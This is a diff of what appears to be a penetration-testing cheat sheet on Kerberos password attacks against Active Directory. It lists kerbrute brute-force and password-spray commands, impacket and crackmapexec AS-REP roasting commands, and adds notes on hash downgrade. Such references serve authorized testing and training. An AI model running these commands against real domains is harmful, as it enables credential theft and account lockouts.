@@ -1,14 +1,14 @@
 # Passwords
 ## Kerberos
-Find users with brute force - WILL LOCKOUT USER:
+Brute force passwords - WILL LOCKOUT USER:
 `kerbrute bruteuser --dc <IP> -d <DOMAIN> <PASSLIST> <USER>`
 
 Check a password for userlist:
 `kerbrute passwordspray --dc <IP> -d <DOMAIN> -v <USERLIST> <PASS>`
 
 AS-REP (AS-REP Roasting):
-`impacket-GetNPUsers -dc-ip <IP> <DOMAIN>/ -usersfile <USERLIST>` 
-`impacket-GetNPUsers -dc-ip <IP> <DOMAIN>/<USER>:<PASS> -request`
+`impacket-GetNPUsers -dc-ip <IP> <DOMAIN>/ -usersfile <USERLIST>` # use --downgrade to get correct hash
+`impacket-GetNPUsers -dc-ip <IP> <DOMAIN>/<USER>:<PASS> -request` # use --downgrade to get correct hash
 `crackmapexec ldap <IP> --kdcHost <IP> -u <USER> -p <PASS> --asreproast <OUTPUT>`
 
 TGS-REP (Kerberoasting):
